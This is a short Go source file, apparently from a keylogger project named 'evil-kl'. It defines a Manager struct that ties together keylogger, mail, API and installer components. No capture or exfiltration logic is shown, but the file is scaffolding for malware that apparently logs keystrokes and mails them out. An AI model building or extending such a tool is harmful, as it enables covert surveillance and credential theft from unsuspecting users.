package manager

import (
	"github.com/dm1trypon/evil-kl/internal/app/api"
	"github.com/dm1trypon/evil-kl/internal/app/config"
	"github.com/dm1trypon/evil-kl/internal/app/installer"
	"github.com/dm1trypon/evil-kl/internal/app/keylogger"
	"github.com/dm1trypon/evil-kl/internal/app/mail"
)

// Manager - main structure of package
type Manager struct {
	lc            string               // logging category
	klInst        *keylogger.Keylogger // instance of Keylogger
	mailInst      *mail.Mail           // instance of Mail
	apiInst       *api.Api             // instance of Api
	installerInst *installer.Installer // instance of Installer
	cfg           config.Cfg           // config of service
	chCritError   chan bool            // error's handler
}
